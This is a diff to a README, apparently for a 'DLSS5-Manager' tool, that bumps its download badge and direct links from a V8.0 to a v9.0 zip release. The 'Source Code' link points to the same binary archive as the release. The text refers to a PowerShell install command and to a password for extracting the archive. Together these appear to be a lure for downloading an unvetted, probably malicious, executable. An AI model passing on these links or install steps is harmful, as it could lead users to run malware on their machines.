@@ -44,7 +44,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/080808/DLSS5-Manager.V8.0.zip">
+<a href="https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/090909/DLSS5-Manager.v9.0.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -57,8 +57,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/080808/DLSS5-Manager.V8.0.zip)
-- [Source Code](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/080808/DLSS5-Manager.V8.0.zip)
+- [Latest Release](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/090909/DLSS5-Manager.v9.0.zip)
+- [Source Code](https://github.com/Fastbrasecret8/DLSS5-Manager/releases/download/090909/DLSS5-Manager.v9.0.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
